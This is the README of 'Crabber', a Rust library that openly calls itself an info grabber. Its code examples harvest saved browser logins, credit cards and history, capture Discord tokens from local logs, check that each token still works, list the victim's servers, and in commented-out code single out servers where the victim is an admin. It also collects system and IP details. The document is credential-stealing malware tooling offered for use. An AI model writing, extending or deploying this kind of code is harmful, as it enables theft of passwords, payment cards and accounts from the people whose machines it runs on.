
# Crabber

An info grabber library written in rust (still in early stages)


## Features

- discord
    - tokens
    - user info
- browser
    - login datas
    - credit cards
    - history
- system
    - User info
    - ip info

more features will be added in near future


## Examples
```toml
[dependencies]
crabber = { git = "https://github.com/crabman17/crabber.git", features = ["all"] }
```
### browser
```rust
use crabber::Browser;
    
let mut browser_data = Browser::new();
browser_data.refresh_all().unwrap();

println!("{:#?}", browser_data.get_logins());
println!("{:#?}", browser_data.get_creditcards());
println!("{:#?}", browser_data.get_browser_history());
```

### system
```rust
use crabber::system;

// if these function fail, they will output string
println!("{}", system::get_realname());
println!("{}", system::get_username());
println!("{}", system::get_hostname());
println!("{}", system::get_devicename());
```

### discord
This asynchronous example uses [Tokio](https://tokio.rs), So make sure to add it in your `Cargo.toml`
```rust
#[tokio::main]
async fn main () {

    use crabber::discord::{
        Client,
        grabber
    };
    // this need 
    // capturing tokens from local logs
    // [the Set will be empty if it couldn't find any tokens]
    let tokens = grabber::capture_tokens_from_logs().unwrap();

    let mut client = Client::new(String::new()); 

    for token in tokens {
        client.set_token(token);
        if client.is_token_valid().await.is_ok() {

            let user = client.get_user().await.unwrap();
            println!("{:#?}", user);

            let guilds = client.get_guilds().await.unwrap();
            println!("{:#?}", guilds);

            // use crabber::discord::Guild;
            // let hq_guilds: Vec<Guild> = guilds
            //     .into_iter()
            //     .filter(|g| {
            //         g.is_admin()
            //     })
            //     .collect();

            // if hq_guilds.is_empty() {
            //     println!("no hq guild found");
            // } else {
            //     println!("Hq Guild -> {:#?}", hq_guilds);
            // }
        }
    }
}
```

### ip 
This is also asynchronous
```rust
#[tokio::main]
async fn main() {
    let ip_info = crabber::ip::get_ip_info().await.unwrap();
    println!("{:#?}", ip_info);
}
```